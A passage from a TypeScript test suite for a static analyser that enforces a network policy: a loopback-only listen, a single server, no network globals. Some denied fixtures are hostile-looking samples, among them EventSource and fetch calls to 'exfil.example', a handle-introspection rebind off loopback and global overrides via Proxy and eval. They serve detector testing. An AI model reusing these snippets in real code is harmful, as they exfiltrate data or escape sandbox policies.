      expect(result.findings, `${source}\n${describeFindings(result)}`).toHaveLength(1);
    }
    for (const source of [
      `globalThis.valueOf?.();`,
      `void globalThis.valueOf?.();`,
      `typeof globalThis.valueOf?.();`,
      `globalThis.valueOf?.().console.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_CALL']);
      expect(result.findings, source).toHaveLength(1);
    }
    for (const source of [
      `globalThis.console?.log?.('x');`,
      `void globalThis.console;`,
      `typeof globalThis.console;`,
      `globalThis?.console.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
  });

  it('preserves allowed chains, statement-position results and eligible propagation', () => {
    for (const source of [
      withServer(`server.listen(4317, '127.0.0.1').close();`),
      inListener(`response.setHeader('a', 'b').end('x');`),
      withServer(`void server.listen(4317, '127.0.0.1');`),
      withServer(`server.listen(4317, '127.0.0.1', () => { console.log('up'); });`),
      withServer(`function setup(s: http.Server) { s.close(); }\nsetup(server.listen(4317, '127.0.0.1'));`),
      withServer(`const started = server.listen(4317, '127.0.0.1');\nstarted.close();`),
      `globalThis.console.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, source).toBe('ALLOW');
    }
  });

  it('establishes SERVER authority on a const alias of a listen result as ALIAS, converging within the derived bound', () => {
    const rooted = factsOfConst(withServer(`const leaked = server.listen(4317, '127.0.0.1');\nleaked.close();`), 'leaked');
    expect(rooted.facts).toEqual(['SERVER:ALIAS']);
    expect(rooted.result.fixpoint.state).toBe('CONVERGED');
    expect(rooted.result.fixpoint.iterations).toBeLessThanOrEqual(rooted.bound);
    expect(rooted.result.fixpoint.bound).toBe(rooted.bound);
    expect(rooted.result.verdict, describeFindings(rooted.result)).toBe('ALLOW');

    const direct = factsOfConst(`${NS}\nconst leaked = http.createServer(${L}).listen(4317, '127.0.0.1');\nleaked.close();`, 'leaked');
    expect(direct.facts).toEqual(['SERVER:ALIAS']);
    expect(direct.result.fixpoint.state).toBe('CONVERGED');

    const chained = factsOfConst(withServer(`const a = server.listen(4317, '127.0.0.1');\nconst b = a.close();\nb.close();`), 'b');
    expect(chained.facts).toEqual(['SERVER:ALIAS']);
    expect(chained.result.fixpoint.state).toBe('CONVERGED');
    expect(chained.result.fixpoint.iterations).toBeLessThanOrEqual(chained.bound);

    const viaParam = factsOfConst(withServer(`function setup(s: http.Server) { const t = s.listen(4317, '127.0.0.1'); t.close(); }\nsetup(server);`), 't');
    expect(viaParam.facts).toEqual(['SERVER:PARAM']);
    expect(viaParam.result.fixpoint.state).toBe('CONVERGED');

    const response = factsOfConst(inListener(`const r2 = response.setHeader('a', 'b');\nr2.end();`), 'r2');
    expect(response.facts).toEqual(['RESPONSE:ALIAS']);
  });

  it('does not let optional calls enter the direct-call rule: the existing member policy already denies them', () => {
    const optionalCall = inspectNetworkPolicy(withServer(`const x = server.listen?.(1);\nuse(x);`));
    const declaration = collectNodes(optionalCall.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === 'x');
    const symbol = declaration === undefined ? undefined : optionalCall.valueSymbolOf(declaration.name);
    expect(symbol && optionalCall.factsOf(symbol)).toEqual([]);
    expect(optionalCall.result.reasons).toEqual(['SERVER_MEMBER']);
    for (const [source, reason] of [
      [withServer(`server.listen?.(1).on('x', () => {});`), 'SERVER_MEMBER'],
      [withServer(`server?.listen(4317, '127.0.0.1').on('x', () => {});`), 'SERVER_MEMBER'],
      [inListener(`response.end?.('x').socket;`), 'RESPONSE_MEMBER'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, source).toEqual([reason]);
      expect(result.findings, source).toHaveLength(1);
    }
  });

  it('keeps computed/indeterminate keys on their existing verdicts without a second finding', () => {
    const server = analyzeNetworkPolicy(withServer(`declare const k: string;\nserver[k]().on('x', () => {});`));
    expect(server.reasons).toEqual(['SERVER_MEMBER']);
    expect(server.findings).toHaveLength(1);
    const global = analyzeNetworkPolicy(`declare const k: string;\nglobalThis[k]().fetch('x');`);
    expect(global.reasons).toEqual(['GLOBAL_RECEIVER_RUNTIME_KEY']);
    expect(global.findings).toHaveLength(1);
    const overLong = analyzeNetworkPolicy(withServer(`server['listenButMuchLongerThanAnyPolicyName']().on('x', () => {});`));
    expect(overLong.reasons).toEqual(['SERVER_MEMBER']);
    expect(overLong.findings).toHaveLength(1);
  });

  it('gives user-defined methods no authority unless their receiver already carries it', () => {
    for (const source of [
      withServer(`const o = { listen: () => ({ on: (x: string) => x }) };\no.listen().on('x');\nserver.close();`),
      inListener(`const box = { end: () => ({ socket: 1 }) };\nbox.end().socket;\nresponse.end();`),
      `const self = { valueOf: () => ({ fetch: 1 }) };\nconst v = self.valueOf();\nv.fetch;`,
      `${NS}\nfunction other(request: any, response: any) { request.url().socket; response.end().socket; }`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
    const carried = analyzeNetworkPolicy(withServer(`function setup(s: http.Server) { s.listen(4317, '127.0.0.1').on('x', () => {}); }\nsetup(server);`));
    expect(carried.reasons).toEqual(['SERVER_MEMBER']);
  });

  it('leaves the existing escape rules effective', () => {
    for (const [source, reason] of [
      [withServer(`use(server);`), 'SERVER_ESCAPE'],
      [inListener(`const box = { request };`), 'REQUEST_ESCAPE'],
      [inListener(`use(response);`), 'RESPONSE_ESCAPE'],
      [`const g = globalThis;`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`use(self);`, 'GLOBAL_RECEIVER_ESCAPE'],
    ] as const) {
      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([reason]);
    }
  });

  it('evaluates receiver facts once per chain level: long allowed chains stay polynomial, correct and CONVERGED', () => {
    // Receiver-call result authority inheritance once recomputed the receiver's
    // facts at every level (2^depth evaluations for `server.close().close()...`).
    // `inheritingReceiverOf` now computes them exactly once and `expressionFacts`
    // consumes that result, so one evaluation is linear in chain depth and
    // classifying every nested call node of a depth-n chain is O(n^2) overall.
    // The witness is the deterministic evaluation counter, not wall-clock time.
    const DEPTHS = [8, 16, 24];
    const chains: Record<string, (depth: number) => string> = {
      server: (depth) => withServer(`server${'.close()'.repeat(depth)};`),
      response: (depth) => inListener(`response${".setHeader('a', 'b')".repeat(depth)};`),
    };
    for (const [name, build] of Object.entries(chains)) {
      for (const depth of DEPTHS) {
        const label = `${name} chain depth ${String(depth)}`;
        const inspection = inspectNetworkPolicy(build(depth));
        expect(inspection.result.reasons, label).toEqual([]);
        expect(inspection.result.verdict, label).toBe('ALLOW');
        expect(inspection.result.fixpoint.state, label).toBe('CONVERGED');
        expect(inspection.result.fixpoint.iterations, label).toBeLessThanOrEqual(inspection.fixpointBound);
        // Polynomial ceiling, and strictly below the exponential floor of per-level re-evaluation.
        expect(inspection.expressionFactsEvaluations, label).toBeLessThanOrEqual((depth + 3) ** 2);
        expect(inspection.expressionFactsEvaluations, label).toBeLessThan(2 ** depth);
        // One more level costs at most a linear number of extra evaluations.
        const deeper = inspectNetworkPolicy(build(depth + 1));
        expect(deeper.expressionFactsEvaluations - inspection.expressionFactsEvaluations, label).toBeGreaterThan(0);
        expect(deeper.expressionFactsEvaluations - inspection.expressionFactsEvaluations, label).toBeLessThanOrEqual(4 * depth);
        // Deterministic: the same source always costs the same number of evaluations.
        expect(inspectNetworkPolicy(build(depth)).expressionFactsEvaluations, label).toBe(inspection.expressionFactsEvaluations);
      }
    }
    // Verdict semantics are unchanged at the end of a long chain: one finding, existing reason codes.
    const deniedServer = analyzeNetworkPolicy(withServer(`server${'.close()'.repeat(24)}.on('x', () => {});`));
    expect(deniedServer.reasons, describeFindings(deniedServer)).toEqual(['SERVER_MEMBER']);
    expect(deniedServer.findings).toHaveLength(1);
    expect(deniedServer.fixpoint.state).toBe('CONVERGED');
    const deniedResponse = analyzeNetworkPolicy(inListener(`response${".end('x')".repeat(24)}.socket;`));
    expect(deniedResponse.reasons, describeFindings(deniedResponse)).toEqual(['RESPONSE_MEMBER']);
    expect(deniedResponse.findings).toHaveLength(1);
    const tail = factsOfConst(withServer(`const tail = server${'.close()'.repeat(24)};\ntail.close();`), 'tail');
    expect(tail.facts).toEqual(['SERVER:ALIAS']);
    expect(tail.result.verdict, describeFindings(tail.result)).toBe('ALLOW');
    expect(tail.result.fixpoint.state).toBe('CONVERGED');
    expect(tail.result.fixpoint.iterations).toBeLessThanOrEqual(tail.bound);
    // The fixpoint still fail-closes on a chain when the ceiling is reached.
    const exhausted = analyzeNetworkPolicy(withServer(`server${'.close()'.repeat(24)};`), { fixpointCeiling: 1 });
    expect(exhausted.fixpoint).toEqual({ state: 'EXHAUSTED', iterations: 1, bound: 1 });
    expect(exhausted.reasons).toEqual(['FIXPOINT_EXHAUSTED']);
    // The counter sits at the entry of the single expression-authority lookup.
    expect(occurrences(readFileSync(detectorPath, 'utf8'), 'expressionFactsEvaluations += 1')).toBe(1);
  });

  it('is structural: one expression-authority lookup, no member-name special cases', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function expressionFacts(')).toBe(1);
    expect(occurrences(detector, 'function inheritingReceiverOf(')).toBe(1);
    expect(occurrences(detector, 'function classesOf(')).toBe(1);
    expect(occurrences(detector, 'factsOf(ctx, valueSymbolOf(')).toBe(1);
    // The invocation check (call, construct, tagged template) is confined to the global-receiver path; target classes keep the direct-call predicate.
    expect(occurrences(detector, 'const memberCallOf = ')).toBe(1);
    expect(occurrences(detector, 'memberCallOf(parent)')).toBe(1);
    expect(occurrences(detector, 'inheritingReceiverOf(ctx, ')).toBe(1);
    for (const forbidden of ['valueOf', 'toString', 'receiverPreserving', 'RETURNS_THIS']) {
      expect(occurrences(detector, forbidden), forbidden).toBe(0);
    }
    expect(POLICY_KEY_NAMES).not.toContain('valueOf');
  });
});

// ---------------------------------------------------------------------------
// Loopback listen binding and server instantiation site bound (PR #67 B1 / B2)
// ---------------------------------------------------------------------------

describe('D3 network policy loopback listen binding (PR #67 B1)', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
  const withFactory = (rest: string): string =>
    `${NS}\nexport function createCockpitServer(): http.Server {\n  return http.createServer(${L});\n}\n${rest}`;

  it('denies every non-loopback or indeterminate listen shape on a proven SERVER target with one finding', () => {
    for (const source of [
      withServer(`server.listen(4317, '0.0.0.0');`),
      withServer(`server.listen(4317, '::');`),
      withServer(`server.listen(4317);`),
      withServer(`server.listen();`),
      withServer(`server.listen(4317, '::1');`),
      withServer(`server.listen(4317, 'localhost');`),
      withServer(`declare const dynamicHost: string;\nserver.listen(4317, dynamicHost);`),
      withServer(`let host = '127.0.0.1';\nserver.listen(4317, host);`),
      withServer(`const HOST = '0.0.0.0';\nserver.listen(4317, HOST);`),
      withServer(`declare const port: number;\nserver.listen(port, '127.0.0.1');`),
      withServer(`server.listen(${String(PORT_MAX + 1)}, '127.0.0.1');`),
      withServer(`server.listen('/tmp/cockpit.sock', '127.0.0.1');`),
      withServer(`server.listen({ port: 4317, host: '127.0.0.1' });`),
      withServer(`declare const args: [number, string];\nserver.listen(...args);`),
      withServer(`declare const rest: [() => void];\nserver.listen(4317, '127.0.0.1', ...rest);`),
      withServer(`server.listen(4317, '127.0.0.1', 511);`),
      withServer(`declare const onUp: () => void;\nserver.listen(4317, '127.0.0.1', onUp);`),
      withServer(`server.listen(4317, '127.0.0.1', () => {}, 511);`),
      withServer(`server['listen'](4317);`),
      withServer(`server.close().listen(4317);`),
      `${NS}\nhttp.createServer(${L}).listen(4317);`,
      withServer(`function setup(s: http.Server) { s.listen(4317); }\nsetup(server);`),
      withFactory(`createCockpitServer().listen(4317);`),
      withServer(`const a = server;\na.listen(4317, '0.0.0.0');`),
      REAL_HOST_REPLICA.replace(`'127.0.0.1'`, `'0.0.0.0'`),
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['SERVER_LISTEN_BINDING']);
      expect(result.findings, `${source}\n${describeFindings(result)}`).toHaveLength(1);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
  });

  it('allows the statically proven loopback shape, including the real host form', () => {
    for (const source of [
      withServer(`server.listen(4317, '127.0.0.1');`),
      withServer(`server.listen(4317, '127.0.0.1', () => { console.log('up'); });`),
      withServer(`server.listen(4317, '127.0.0.1', function () { console.log('up'); });`),
      withServer(`function onUp() { console.log('up'); }\nserver.listen(4317, '127.0.0.1', onUp);`),
      withServer(`const onUp = () => { console.log('up'); };\nserver.listen(4317, '127.0.0.1', onUp);`),
      withServer(`export const HOST = '127.0.0.1';\nexport const PORT = 4317;\nserver.listen(PORT, HOST, () => {});`),
      withServer('server.listen(4317, `127.0.0.1`);'),
      withServer(`server.listen(4317 as number, ('127.0.0.1' as string));`),
      withServer(`server['listen'](4317, '127.0.0.1');`),
      withServer(`server.listen('4317', '127.0.0.1');`),
      withServer(`server.listen(0x10dd, '127.0.0.1');`),
      withServer(`server.listen(0, '127.0.0.1');`),
      withServer(`server.listen(${String(PORT_MAX)}, '127.0.0.1');`),
      withServer(`server.close().listen(4317, '127.0.0.1');`),
      withServer(`function setup(s: http.Server) { s.listen(4317, '127.0.0.1'); }\nsetup(server);`),
      REAL_HOST_REPLICA,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, source).toBe('ALLOW');
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
  });

  it('is one further positive check after the member policy; a misbound listen result keeps SERVER authority', () => {
    expect(analyzeNetworkPolicy(withServer(`server.listen?.(4317);`)).reasons).toEqual(['SERVER_MEMBER']);
    const chained = analyzeNetworkPolicy(withServer(`server.listen(4317).on('x', () => {});`));
    expect(chained.reasons, describeFindings(chained)).toEqual(['SERVER_LISTEN_BINDING', 'SERVER_MEMBER']);
    expect(chained.findings).toHaveLength(2);
    const aliased = inspectNetworkPolicy(withServer(`const started = server.listen(4317);\nstarted.close();`));
    const declaration = collectNodes(aliased.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === 'started');
    const symbol = declaration === undefined ? undefined : aliased.valueSymbolOf(declaration.name);
    expect(symbol && aliased.factsOf(symbol)).toEqual(['SERVER:ALIAS']);
    expect(aliased.result.reasons).toEqual(['SERVER_LISTEN_BINDING']);
    const unprivileged = analyzeNetworkPolicy(`const o = { listen: (port: number) => port };\no.listen(4317);`);
    expect(unprivileged.reasons).toEqual([]);
  });

  it('is structural: the loopback host is a positive policy key, not a dangerous-name table', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(LOOPBACK_HOST).toBe('127.0.0.1');
    expect(POLICY_KEY_NAMES).toContain(LOOPBACK_HOST);
    expect(STATIC_KEY_CEILING).toBe('createServer'.length);
    expect(occurrences(detector, 'function isLoopbackListen(')).toBe(1);
    expect(occurrences(detector, "deny(ctx, 'SERVER_LISTEN_BINDING'")).toBe(1);
    for (const forbidden of [`'0.0.0.0'`, `'::'`, `'::1'`, 'localhost', 'DANGEROUS', 'WILDCARD']) {
      expect(occurrences(detector, forbidden), forbidden).toBe(0);
    }
  });
});

describe('D3 network policy server instantiation site bound (PR #67 B2)', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
  const withFactory = (rest: string): string =>
    `${NS}\nexport function createCockpitServer(): http.Server {\n  return http.createServer(${L});\n}\n${rest}`;

  it('denies a second server-instantiation site outside a confined factory body, one finding per extra site', () => {
    for (const [source, extraSites] of [
      [`${NS}\nconst a = http.createServer(${L});\nconst b = http.createServer(${L});\na.close();\nb.close();`, 1],
      [`${NS}\nhttp.createServer(${L});\nhttp.createServer(${L});`, 1],
      [`${NS}\nhttp.createServer(${L});\nhttp.createServer(${L});\nhttp.createServer(${L});`, 2],
      [withFactory(`const a = createCockpitServer();\nconst b = http.createServer(${L});\na.close();\nb.close();`), 1],
      [withFactory(`createCockpitServer().close();\ncreateCockpitServer().close();`), 1],
      [`${NS}\nconst make = () => http.createServer(${L});\nconst a = make();\nconst b = make();\na.close();\nb.close();`, 1],
      [withFactory(`const first = createCockpitServer();\nconst alias = first;\nconst second = createCockpitServer();\nalias.close();\nsecond.close();`), 1],
      [withFactory(`const HOST = '127.0.0.1';\nconst PORT = 4317;\nfunction main() { const server = createCockpitServer(); server.listen(PORT, HOST, () => {}); const spare = createCockpitServer(); spare.close(); }\nmain();`), 1],
      [`${REAL_HOST_REPLICA}\nhttp.createServer(${L}).close();`, 1],
      [`${NS}\nfunction a() { http.createServer(${L}).close(); }\nfunction b() { http.createServer(${L}).close(); }\na();\nb();`, 1],
      [`${NS}\nfunction make() { return http.createServer((request, response) => { http.createServer(${L}).close(); response.end('x'); }); }\nmake().close();`, 1],
      [withFactory(`function outer() { return createCockpitServer(); }\nouter().close();\nouter().close();`), 1],
      [withFactory(`function outer() { return createCockpitServer(); }\nouter().close();\ncreateCockpitServer().close();`), 1],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['CREATE_SERVER_MULTIPLE']);
      expect(result.findings, `${source}\n${describeFindings(result)}`).toHaveLength(extraSites);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
    // The finding names the later site, in source order.
    const two = analyzeNetworkPolicy(`${NS}\nconst a = http.createServer(${L});\nconst b = http.createServer(${L});\na.close();\nb.close();`);
    expect(two.findings[0]?.line).toBe(3);
    expect(two.findings[0]?.text.startsWith('http.createServer(')).toBe(true);
  });

  it('allows exactly one site: direct, through a confined factory, or with alias-returning factories', () => {
    for (const source of [
      withServer(`server.close();`),
      withFactory(`createCockpitServer().close();`),
      withFactory(`http.createServer(${L}).close();`),
      withServer(`function get() { return server; }\nfunction again() { return get(); }\nagain().close();\nget().close();`),
      `${NS}\nfunction make(x: boolean) { if (x) { return http.createServer(${L}); } return http.createServer(${L}); }\nmake(true).close();`,
      withFactory(`function outer() { return createCockpitServer(); }\nouter().close();`),
      `${NS}\nfunction make(label: string) { const s = http.createServer(${L}); s.listen(4317, '127.0.0.1'); console.log(label); return s; }\nmake('x');`,
      REAL_HOST_REPLICA,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, source).toBe('ALLOW');
    }
  });

  it('is a static source-site bound: runtime call multiplicity of one site is outside the declared boundary', () => {
    for (const source of [
      `${NS}\nfunction boot() { http.createServer(${L}).close(); }\nboot();\nboot();`,
      `${NS}\nfor (let i = 0; i < 2; i += 1) { http.createServer(${L}).close(); }`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
      expect(result.reasons, source).not.toContain('CREATE_SERVER_MULTIPLE');
    }
  });

  it('runs after the fixpoint only: exhaustion still fails closed without a site finding', () => {
    const result = analyzeNetworkPolicy(`${NS}\nhttp.createServer(${L});\nhttp.createServer(${L});`, { fixpointCeiling: 1 });
    expect(result.fixpoint.state).toBe('EXHAUSTED');
    expect(result.reasons).toEqual(['FIXPOINT_EXHAUSTED']);
  });

  it('is structural: one site count over the collected calls, no new analysis', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function checkInstantiationSites(')).toBe(1);
    expect(occurrences(detector, "deny(ctx, 'CREATE_SERVER_MULTIPLE'")).toBe(1);
    expect(occurrences(detector, 'checkInstantiationSites(ctx)')).toBe(1);
    expect(occurrences(detector, 'serverFactories')).toBe(0);
    expect(occurrences(detector, 'serverCount')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Codex review closure: EventSource network global, runtime shadows (PR #67)
// ---------------------------------------------------------------------------

describe('D3 network policy closes the open Codex findings on PR #67', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;

  it('P1: EventSource is a network global on the supported runtime, blocked like fetch and WebSocket', () => {
    expect([...NETWORK_GLOBAL_NAMES].sort()).toEqual(['EventSource', 'WebSocket', 'fetch']);
    expect(STATIC_KEY_CEILING).toBe('createServer'.length);
    for (const [source, reason] of [
      [`new EventSource('https://exfil.example/');`, 'FREE_GLOBAL_NETWORK'],
      [`const E = EventSource;`, 'FREE_GLOBAL_NETWORK'],
      [`new globalThis.EventSource('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`new window['EventSource']('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`const { EventSource: E } = globalThis;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
      expect(result.findings, source).toHaveLength(1);
    }
    for (const source of [`class EventSource {}\nnew EventSource();`, `let es: EventSource | null = null;\nes;`, `const o = { EventSource: 1 };\no.EventSource;`]) {
      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([]);
    }
  });

  it('P2: a named function expression binds its name inside its own body at runtime', () => {
    for (const source of [
      `const f = function fetch() { return fetch; };\nf();`,
      `const open = function WebSocket(url: string) { return url ? WebSocket : null; };\nopen('x');`,
      `use(function EventSource() { return new EventSource(); });`,
    ]) {
      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([]);
    }
    const outside = analyzeNetworkPolicy(`const f = function fetch() { return 1; };\nfetch('x');`);
    expect(outside.reasons).toEqual(['FREE_GLOBAL_NETWORK']);
    expect(outside.findings).toHaveLength(1);
  });

  it('P2: a private import-equals alias of a value is a runtime binding; an alias of a type stays erased', () => {
    for (const source of [
      `import * as Local from './x.js';\nimport fetch = Local.f;\nfetch('x');`,
      `namespace Local {\n  export const f = (url: string) => url;\n}\nimport fetch = Local.f;\nfetch('x');`,
      `import { f } from './x.js';\nimport fetch = f;\nfetch('x');`,
      `namespace Local {\n  export const f = 1;\n}\nimport g = Local.f;\nimport fetch = g;\nfetch;`,
      `namespace Local {\n  export const x = 1;\n}\nimport fetch = Local;\nfetch.x;`,
      `namespace Local {\n  export const f = 1;\n}\nnamespace fetch {\n  import f = Local.f;\n  export const g = f;\n}\nfetch.g;`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
    for (const source of [
      `namespace Local {\n  export type f = string;\n}\nimport fetch = Local.f;\nfetch;`,
      `import type { f } from './x.js';\nimport fetch = f;\nfetch;`,
      `namespace Local {\n  export type T = string;\n}\nimport fetch = Local;\nfetch;`,
      `namespace Local {\n  export type T = string;\n}\nnamespace fetch {\n  import T = Local.T;\n}\nfetch;`,
      `import type fetch = require('./local.js');\nfetch('x');`,
      `import fetch = fetch;\nfetch;`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['FREE_GLOBAL_NETWORK']);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
  });

  it('P1 (already structural): fluent privileged results, valueOf laundering and the server bound stay denied', () => {
    const fluent = analyzeNetworkPolicy(withServer(`export const leaked = server.listen(4317, '127.0.0.1');\nleaked.on('connection', (socket) => { socket.write('x'); });`));
    // The export is the denial; an exported binding is unconfined and carries no further authority to check.
    expect(fluent.reasons, describeFindings(fluent)).toEqual(['SERVER_EXPORT']);
    const fluentResponse = analyzeNetworkPolicy(`${NS}\nhttp.createServer((request, response) => { response.setHeader('a', 'b').socket; });`);
    expect(fluentResponse.reasons, describeFindings(fluentResponse)).toEqual(['RESPONSE_MEMBER']);
    const laundered = analyzeNetworkPolicy(`const g = globalThis.valueOf() as typeof globalThis;\ng.fetch('https://exfil.example/');`);
    expect(laundered.reasons, describeFindings(laundered)).toEqual(['GLOBAL_RECEIVER_CALL']);
    const twice = analyzeNetworkPolicy(`${NS}\nfunction make() { return http.createServer(${L}); }\nconst a = make();\nconst b = make();\na.listen(4317, '127.0.0.1');\nb.listen(4318, '0.0.0.0');`);
    expect(twice.reasons, describeFindings(twice)).toEqual(['CREATE_SERVER_MULTIPLE', 'SERVER_LISTEN_BINDING']);
  });

  it('P1: writes to permitted global members are denied, reads of them stay allowed', () => {
    for (const source of [
      `(globalThis.String as any) = (value: unknown) => value;`,
      `globalThis.String = String;`,
      `(globalThis as any).String = 1;`,
      `window.String = String;`,
      `globalThis.globalThis.String = String;`,
      `delete (globalThis as any).String;`,
      `(globalThis as any).String += 1;`,
      `(globalThis as any).String++;`,
      `[(globalThis as any).String] = [1];`,
      `({ x: (globalThis as any).String } = { x: 1 });`,
      `for ((globalThis as any).String of [1]) {}`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}
${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_WRITE']);
      expect(result.findings, source).toHaveLength(1);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
    // Codex witness: the write is denied on its own, and `response.end(String(1))` is unproven regardless.
    const witness = analyzeNetworkPolicy(
      `${NS}
(globalThis.String as any) = () => new Proxy(() => {}, { apply(_target: unknown, res: http.ServerResponse) { res.req.socket.write('x'); } });
http.createServer((request, response) => { response.end(String(1)); });`,
    );
    expect(witness.reasons, describeFindings(witness)).toEqual(['GLOBAL_RECEIVER_WRITE', 'RESPONSE_END_ARGUMENT']);
    for (const source of [
      `String(1);`,
      `globalThis.String.length;`,
      `typeof globalThis.String;`,
      `const n = globalThis.String.length;
n;`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}
${describeFindings(result)}`).toEqual([]);
    }
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, "deny(ctx, 'GLOBAL_RECEIVER_WRITE'")).toBe(1);
  });

  it('P1: the process global has one permitted runtime use, process.argv[<index>]; every other use is denied', () => {
    const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
    for (const source of [
      // Codex witness: handle introspection recovers the listening server and rebinds it off loopback.
      withServer(
        `server.listen(4317, '127.0.0.1', () => {\n  const [handle] = (process as any)._getActiveHandles();\n  handle.close(() => handle.listen(4318, '0.0.0.0'));\n});`,
      ),
      `(process as any)._getActiveHandles();`,
      `process.getBuiltinModule('http');`,
      `(process as any).binding('http');`,
      `process.cwd();`,
      `process.env.HOME;`,
      `process.exit(1);`,
      `process.on('exit', () => {});`,
      `process.argv;`,
      `process.argv.length;`,
      `process.argv.slice(2);`,
      `const args = process.argv;\nargs;`,
      `const [, entry] = process.argv;\nentry;`,
      `const { argv } = process;\nargv;`,
      `process.argv[1] = 'x';`,
      `process.argv = [];`,
      `declare const i: number;\nprocess.argv[i];`,
      `use(process);`,
      `const p = process;\np.argv[1];`,
      `[process].length;`,
      `globalThis.process._getActiveHandles();`,
      `globalThis.process.cwd();`,
      `(globalThis as any)['process'].binding('http');`,
      `window.process.argv;`,
      `const { process: p } = globalThis;\np.argv[1];`,
      `let p: unknown;\n({ process: p } = globalThis);\np;`,
      `const { process } = globalThis;\nprocess.argv[1];`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['PROCESS_GLOBAL_USE']);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
    for (const source of [
      `process.argv[1];`,
      `const entryArgument = process.argv[1];\nentryArgument;`,
      `(process as any).argv[1];`,
      `process['argv'][1];`,
      `process.argv['1'];`,
      `process['arg' + 'v'][1];`,
      `globalThis.process.argv[1];`,
      `typeof process;`,
      `process;`,
      `void process;`,
      `function main(process: { cwd(): string }) { return process.cwd(); }\nmain;`,
      `const process = { argv: ['x'] };\nprocess.argv.slice(0);`,
      REAL_HOST_REPLICA,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
    // One positive shape check, no per-method table: the detector never names a process method.
    expect(POLICY_KEY_NAMES).toContain('process');
    expect(POLICY_KEY_NAMES).toContain('argv');
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function checkProcessUse(')).toBe(1);
    expect(occurrences(detector, 'checkProcessUse(ctx, ')).toBe(2);
    for (const forbidden of ['_getActiveHandles', 'getBuiltinModule', 'binding', 'cwd', 'env']) {
      expect(occurrences(detector, `'${forbidden}'`), forbidden).toBe(0);
    }
  });

  it('P1: a member of a global receiver is never invoked: mutator, generator, construct and tagged-template forms alike', () => {
    for (const source of [
      `(globalThis as any).__defineGetter__('String', () => (value: unknown) => value);`,
      `(globalThis as any).__defineSetter__('String', () => {});`,
      `(globalThis as any)['__define' + 'Getter__']('String', () => 1);`,
      `(globalThis.globalThis as any).__defineGetter__('String', () => 1);`,
      `(window as any).__defineGetter__('fetch', () => 1);`,
      `(self as any).__defineGetter__?.('String', () => 1);`,
      `(global as any)?.__defineGetter__('String', () => 1);`,
      `globalThis.eval('String = 1');`,
      `globalThis.Function('return String')();`,
      `new (globalThis as any).Proxy({}, {});`,
      `globalThis.String\`x\`;`,
      `globalThis.String(1);`,
      `globalThis.valueOf();`,
      `void globalThis.valueOf();`,
      `typeof globalThis.String(1);`,
      `const s = globalThis.String(1);\ns;`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_CALL']);
      expect(result.findings, source).toHaveLength(1);
